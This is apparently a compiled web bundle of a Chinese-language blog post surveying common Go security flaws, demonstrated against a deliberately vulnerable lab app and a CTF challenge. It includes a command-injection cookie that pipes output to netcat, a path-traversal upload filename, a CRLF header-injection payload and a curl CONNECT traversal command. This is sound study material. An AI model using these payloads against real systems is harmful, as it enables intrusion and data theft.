import{_ as t}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as l,o as d,c as o,a as n,b as e,d as s,e as i}from"./app-QRumHIwz.js";const c="/DailyNotes/assets/image-20240923104010179-mth4q8zU.png",p="/DailyNotes/assets/image-20240923104059068-kdS7mzpR.png",r="/DailyNotes/assets/image-20240923104207504-bkHAfAH0.png",u="/DailyNotes/assets/image-20240923152011511-8y0Cvr5B.png",v="/DailyNotes/assets/image-20240923160617852-gPyk6jw9.png",m="/DailyNotes/assets/image-20240923163851673-B2hy7Okl.png",b="/DailyNotes/assets/upload_f6708f74d8bc16d6c4f6d5085e798521-6p0YOWE-.png",h="/DailyNotes/assets/upload_c155e0320b2e007aeda1c3d2f4b63b37-GZ9e88PU.png",k="/DailyNotes/assets/upload_f9abcabe3b0a17bac5f8e41a586d74ab-oVSo8pwv.png",g="/DailyNotes/assets/upload_07c51c4e5face9078a0c61cadce82aa7-EcD2zvM3.png",f="/DailyNotes/assets/image-20240923223106640-bhxMLgbg.png",x="/DailyNotes/assets/image-20240923222514199-YOh2-2_o.png",y="/DailyNotes/assets/image-20240923223511699-CUNviVEA.png",q="/DailyNotes/assets/image-20240923224143278-LdP8ntr1.png",w={},A=n("h1",{id:"go语言常见漏洞",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#go语言常见漏洞","aria-hidden":"true"},"#"),e(" Go语言常见漏洞")],-1),_=n("h2",{id:"命令注入",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#命令注入","aria-hidden":"true"},"#"),e(" 命令注入")],-1),B={href:"https://github.com/Hardw01f/Vulnerability-goapp",target:"_blank",rel:"noopener noreferrer"},S=i('<p>这里能看到执行命令的``exec.Command`，命令通过拼接传入，所以可以利用管道符，把命令拼在后面。</p><figure><img src="'+c+'" alt="image-20240923104010179" tabindex="0" loading="lazy"><figcaption>image-20240923104010179</figcaption></figure><p>对这个函数查找所有引用，这里能看到，函数取cookie中的<code>adminSID=</code> 字段值，进行拼接</p><figure><img src="'+p+'" alt="image-20240923104059068" tabindex="0" loading="lazy"><figcaption>image-20240923104059068</figcaption></figure><p>接着查找所有引用，就找到了这个监听，从这里传入命令</p><figure><img src="'+r+`" alt="image-20240923104207504" tabindex="0" loading="lazy"><figcaption>image-20240923104207504</figcaption></figure><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/adminusers</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">UserName=&quot;Amuro Ray&quot;; SessionID=UlgtNzgtMkBFRlNGLmNvbQ==; UserID=1; adminSID=abcs&#39;|whoami|nc 127.0.0.1 1234|echo &#39;</span></span>
<span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:9090</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">none</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span></span>
<span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;122&quot;</span></span>
<span class="token header"><span class="token header-name keyword">sec-ch-ua-mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
<span class="token header"><span class="token header-name keyword">sec-ch-ua-platform</span><span class="token punctuation">:</span> <span class="token header-value">&quot;Windows&quot;</span></span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+u+'" alt="image-20240923152011511" tabindex="0" loading="lazy"><figcaption>image-20240923152011511</figcaption></figure><h2 id="文件上传" tabindex="-1"><a class="header-anchor" href="#文件上传" aria-hidden="true">#</a> 文件上传</h2>',9),P={href:"https://github.com/Hardw01f/Vulnerability-goapp",target:"_blank",rel:"noopener noreferrer"},C=i('<p><code>pkg/image/imageUploader.go</code> ，这里保存文件，路径是拼接的，且没有检验</p><figure><img src="'+v+`" alt="image-20240923160617852" tabindex="0" loading="lazy"><figcaption>image-20240923160617852</figcaption></figure><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/profile/edit/upload</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.31.13.26:9090</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">217</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://172.31.13.26:9090</span></span>
<span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryDQNyUK8qxiSbnrgx</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.31.13.26:9090/profile/edit/image</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">UserName=&quot;Amuro Ray&quot;; SessionID=UlgtNzgtMkBFRlNGLmNvbQ==; UserID=1; adminSID=</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>

------WebKitFormBoundaryDQNyUK8qxiSbnrgx
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name=&quot;uploadfile&quot;; filename=&quot;../../../../../../a&quot;</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span>
<span class="token text-plain">
ahujfdvuegougrvour
------WebKitFormBoundaryDQNyUK8qxiSbnrgx--

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>但是，在<code>file, handler, err := r.FormFile(&quot;uploadfile&quot;)</code>会把filename中的<code>../</code>去掉</p><figure><img src="`+m+'" alt="image-20240923163851673" tabindex="0" loading="lazy"><figcaption>image-20240923163851673</figcaption></figure><p>go版本太高就无法复现了，也没查到具体哪个版本更新的，靶场中docker-compose文件里写的go版本是13</p><h2 id="越权" tabindex="-1"><a class="header-anchor" href="#越权" aria-hidden="true">#</a> 越权</h2>',7),T={href:"https://github.com/Hardw01f/Vulnerability-goapp",target:"_blank",rel:"noopener noreferrer"},N=i(`<h2 id="整数反转-溢出" tabindex="-1"><a class="header-anchor" href="#整数反转-溢出" aria-hidden="true">#</a> 整数反转/溢出</h2><h3 id="对无符号数的反转" tabindex="-1"><a class="header-anchor" href="#对无符号数的反转" aria-hidden="true">#</a> 对无符号数的反转</h3><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token keyword">func</span> <span class="token function">uintTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">// uint32取值范围是0到4294967295</span>
	<span class="token keyword">var</span> a <span class="token builtin">uint32</span> <span class="token operator">=</span> <span class="token number">2147483648</span>
	<span class="token keyword">var</span> b <span class="token builtin">uint32</span> <span class="token operator">=</span> <span class="token number">2147483648</span>
	<span class="token keyword">var</span> sum <span class="token operator">=</span> a <span class="token operator">+</span> b
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment">// uint32类型是无符号的，溢出时会循环回到0</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">&quot;Sum is : %d\\n&quot;</span><span class="token punctuation">,</span> sum<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>想要直接声明一个大小已经溢出的数自然不会通过编译，因此出现反转的话，主要是在变量的相加这样的计算才会会导致标志CF位反转</p><h3 id="有符号数的溢出" tabindex="-1"><a class="header-anchor" href="#有符号数的溢出" aria-hidden="true">#</a> 有符号数的溢出</h3><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token keyword">func</span> <span class="token function">intTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">// int8取值范围-128到127</span>
	<span class="token keyword">var</span> a <span class="token builtin">int8</span> <span class="token operator">=</span> <span class="token number">127</span>
	<span class="token keyword">var</span> b <span class="token builtin">int8</span> <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token keyword">var</span> sum <span class="token builtin">int8</span> <span class="token operator">=</span> a <span class="token operator">+</span> b
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment">// 溢出后的值会从-128开始循环，即128 % 256 = 128，所以sum的值会是-128</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">&quot;Sum is : %d\\n&quot;</span><span class="token punctuation">,</span> sum<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="截断" tabindex="-1"><a class="header-anchor" href="#截断" aria-hidden="true">#</a> 截断</h3><p>在类型转换中,也会出现较大整型向较小整型转换的截断问题</p><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token keyword">func</span> <span class="token function">truncated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> a <span class="token builtin">int16</span> <span class="token operator">=</span> <span class="token number">256</span>
	<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">int8</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">// int8取值范围-128到127，256会溢出，取余后得到0</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>一个比较经典的例子就是：<code>kubectl</code>命令行中出现了一个<code>strconv.Atoi</code>导致的截断问题。当我们传入port参数的对应字符串后,容器启动的端口这一参数会将经Atoi处理后的字符串进行int32的类型转换。由于64位系统的int是int64类型。转int32的话会出现明显截断 可以简化成以下代码：</p><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code>v <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span><span class="token string">&quot;4294967377&quot;</span><span class="token punctuation">)</span>
s  <span class="token operator">:=</span> <span class="token function">int32</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>
fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token comment">// 81</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样就有可能导致81端口的服务启动，或者被停止。所以使用<code>ParseInt ,ParseUInt</code>会比较好。或者对端口号进行限制。</p><h2 id="pseudo-rand" tabindex="-1"><a class="header-anchor" href="#pseudo-rand" aria-hidden="true">#</a> pseudo-rand</h2><p><code>math/rand</code> 包中，我们可以看到随机数生成的函数形式</p><figure><img src="`+b+`" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>跟进一下函数与结构体</p><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token keyword">var</span> globalRand <span class="token operator">=</span> <span class="token function">New</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lockedSource<span class="token punctuation">{</span>src<span class="token punctuation">:</span> <span class="token function">NewSource</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>rngSource<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
 
<span class="token operator">...</span><span class="token operator">...</span>
 
<span class="token keyword">func</span> <span class="token function">NewSource</span><span class="token punctuation">(</span>seed <span class="token builtin">int64</span><span class="token punctuation">)</span> Source <span class="token punctuation">{</span>
    <span class="token keyword">var</span> rng rngSource
    rng<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">&amp;</span>rng
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到,这些随机数函数的seed默认为1.也就是说如果不使用<code>rand.Seed()</code>确认种子的话，生成的只是所谓的伪随机数。</p><h2 id="net-http" tabindex="-1"><a class="header-anchor" href="#net-http" aria-hidden="true">#</a> net/http</h2><h3 id="net-http-1-11-crlf注入" tabindex="-1"><a class="header-anchor" href="#net-http-1-11-crlf注入" aria-hidden="true">#</a> net/http &lt; 1.11 CRLF注入</h3><p>在HTTP协议中，HTTP header之间是由一个CRLF字符序列分隔开的，HTTP Header与Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。所以如果用户的输入在HTTP返回包的Header处回显，便可以通过CRLF来提前结束响应头，在响应内容处注入攻击脚本。因此CRLF Injection又叫HTTP响应拆分/截断（HTTP Response Splitting）简称HRS。</p><p>一般网站会在HTTP头中用 <code>Location: http://baidu.com</code> 这种方式来进行302跳转，如果我们能控制 <code>Location:</code> 后面的某个网址的URL，就可以进行HRS攻击。</p><p>一个常见的跳转响应包：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Moved Temporarily</span></span>
<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span><span class="token header-value">Fri,26Jun 2018 17:00:05 GMT</span></span>
<span class="token header"><span class="token header-name keyword">Content-type</span><span class="token punctuation">:</span><span class="token header-value">text/html</span></span>
<span class="token header"><span class="token header-name keyword">Contet-Length</span><span class="token punctuation">:</span><span class="token header-value">155</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span><span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span><span class="token header-value">http://www.sinay.com.cn</span></span>
<span class="token text-html">
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当攻击者利用CRLF字符对响应头中的Location进行如下输入：</p><p><code>%0d%0aSet-Cookie:JSPSESSID%3Dhackingsite</code></p><p>则返回包会变成：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Moved Temporarily</span></span>
<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span><span class="token header-value">Fri,26Jun 2018 17:00:05 GMT</span></span>
<span class="token header"><span class="token header-name keyword">Content-type</span><span class="token punctuation">:</span><span class="token header-value">text/html</span></span>
<span class="token header"><span class="token header-name keyword">Contet-Length</span><span class="token punctuation">:</span><span class="token header-value">155</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span><span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span><span class="token header-value">http://www.sinay.com.cn</span></span>
<span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span><span class="token header-value">JSPSESSID=hackingsite</span></span>
<span class="token text-html">
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击者就可以给访问者设置一个session，造成“会话固定”。通过这种攻击方式可以实现插入任意响应Header。</p><p>低版本的http库会导致CRLF注入。比如<code>http.NewRequest()</code>。貌似是原本没有问题，但是在一次升级中疏忽了导致重新出现 <img src="`+h+'" alt="img" loading="lazy"></p><p>现在会看到存在限制，我们无法传入<code>\\r\\n</code>的字符</p><h3 id="weird-stuff" tabindex="-1"><a class="header-anchor" href="#weird-stuff" aria-hidden="true">#</a> weird stuff</h3>',32),D={href:"https://ctftime.org/event/1050",target:"_blank",rel:"noopener noreferrer"},G=i(`<p>简单陈述下的话，题目提供了一个go http起的FileServer</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http.Handle(&quot;/&quot;, http.FileServer(http.Dir(&quot;/tmp&quot;)))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>flag就在其提供文件服务的文件夹下，但是，出题人加上了web服务的flag路由,从而使得我们没法通过直接访问<code>/flag</code>来获取文件。而是得到<code>/flag</code>路由的回显。</p><p>http的<code>Fileserver</code>在我们访问时，会先根据我们访问的url进行一系列处理，杜绝路径穿越的url之后进行文件读取返回给用户</p><p>但是比较有意思的时，比赛中出现了一个非预期读flag的方式 <code>curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag</code></p><p>简单说就是用CONNECT请求+路径穿越的url读取到了文件。我们看看源码是怎么处理的 <img src="`+k+`" alt="img" loading="lazy"> 如果是CONNECT方式请求，就不会处理url中的特殊字符。导致直接读取flag.其他的请求方法都会在<code>cleanPath</code>中被处理url</p><p>golang1.16处理了这个我问题。</p><h2 id="slice" tabindex="-1"><a class="header-anchor" href="#slice" aria-hidden="true">#</a> slice</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>a := make([]uint64, 0)
a = append(a, 1)
a = append(a, 2)
a = append(a, 3)
b := append(a, 4)
c := append(a, 5)
 
fmt.Println(a)
fmt.Println(b)
fmt.Println(c)
 
//result:
//[1 2 3]
//[1 2 3 5]
//[1 2 3 5]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>按照直觉来说，b这里应该是<code>[1,2,3,4]</code>,但实际上却是<code>[1,2,3,5]</code> 这就与golang的slice也就是切片的结构相关了</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>type slice struct {
    array unsafe.Pointer // ptr
    len   int
    cap   int
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+g+`" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>slice结构中的cap是按2的倍数扩容的。所以说当我们<code>append(3)</code>时会发生第一次扩容，此时len为3，cap为<code>2*2=4</code>. 执行<code>b := append(a, 4)</code>时，我们的4会被放在指针ptr的第四个位置。然后返回ptr len=4 cap=4给b。不过这并没有改变a的结构（slice只是指向内存的指针）之后进行<code>c := append(a, 5)</code>时，由于a没变，新元素只会覆盖之前b那放上的4.</p><h2 id="目录遍历" tabindex="-1"><a class="header-anchor" href="#目录遍历" aria-hidden="true">#</a> 目录遍历</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>filepath.Join()
filepath.Clean()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>Join</code> 将任意数量的路径元素合并成一个单一的路径，并用操作系统特定的分隔符进行分隔。先对路径做一些<code>Clean()</code>处理，但不能完全避免路径目录遍历</p><figure><img src="`+f+`" alt="image-20240923223106640" tabindex="0" loading="lazy"><figcaption>image-20240923223106640</figcaption></figure><p>我们看如下测试代码来验证我们的猜想：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package main

import (
    &quot;fmt&quot;
    &quot;path/filepath&quot;
)

func main() {
    strings := []string{
        &quot;/a/./../b&quot;,
        &quot;a/../b&quot;,
        &quot;..a/./../b&quot;,
        &quot;a/../../../../../../../b/c&quot;,
    }

    domain := &quot;ytm.com&quot;
    fmt.Println(&quot;结果如下：&quot;)
    for _, s := range strings {
        fmt.Println(filepath.Join(domain, s))
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>输出结果如下</p><figure><img src="`+x+`" alt="image-20240923222514199" tabindex="0" loading="lazy"><figcaption>image-20240923222514199</figcaption></figure><p><code>filepath.Clean()</code>函数的作用如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.用一个分隔符元素替换多个分隔符元素。
2.消除每个 . 路径名元素（当前目录）。
3.消除每个内部 .. 路径名元素（父目录）及其前面的非 .. 元素。
4.消除以根路径开头的 .. 元素：也就是说，假设分隔符是“/”，将路径开头的“/..”替换为“/”。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到该<code>filepath.Clean()</code>函数专门允许<code>switch-case</code>&#39;../../../../&#39; 类型的输入。</p><p><img src="`+y+`" alt="image-20240923223511699" loading="lazy"> 那么我们对上述代码改为如下代码，添加了一层<code>filepath.Clean()</code>函数，我们再次运行会发现最后一句打印语句还是<code>../</code>开头，这说明我们不需要在花心思在<code>filepath.Join()</code>函数中，因为<code>Clean()</code>它已经内置了。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package main

import (
    &quot;fmt&quot;
    &quot;path/filepath&quot;
)

func main() {
    strings := []string{
        &quot;/a/./../b&quot;,
        &quot;a/../b&quot;,
        &quot;..a/./../b&quot;,
        &quot;a/../../../../../../../b/c&quot;,
    }

    domain := &quot;ytm.com&quot;
    fmt.Println(&quot;结果如下：&quot;)
    for _, s := range strings {
        fmt.Println(filepath.Clean(filepath.Join(domain, s)))
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="goroutine-泄漏" tabindex="-1"><a class="header-anchor" href="#goroutine-泄漏" aria-hidden="true">#</a> GOROUTINE 泄漏</h2><p>可以参考如下文章</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://github.com/kubernetes/kubernetes/pull/5316
https://github.com/pingcap/tiflow/pull/1034/commits/0a9a1c1d07b6cdd70a0cb2221359d8e221bfb57c
https://bugs.launchpad.net/juju/+bug/1813104
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func print(s []string) {
    for _, v := range s {
        fmt.Println(v)
    }
}

func main() {
    strings := []string{&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, &quot;four&quot;, &quot;five&quot;}
    fmt.Println(&quot;结果如下：&quot;)
    go print(strings)

    time.Sleep(3 * time.Second)
    fmt.Println(&quot;Exiting&quot;)
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>goroutine 的有趣之处在于，调用函数不必等待它们返回即可返回自身。在上述情况下，它通常会导致程序在我们看到控制台上的任何打印之前退出。这是 goroutine 泄漏问题的一部分。如果没有上面的sleep函数，就会这样</p><figure><img src="`+q+`" alt="image-20240923224143278" tabindex="0" loading="lazy"><figcaption>image-20240923224143278</figcaption></figure><p>导致 goroutine 泄漏的另一个重要 Go 概念是通道。如GO官网解释那样：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通道是连接并发 goroutine的管道。
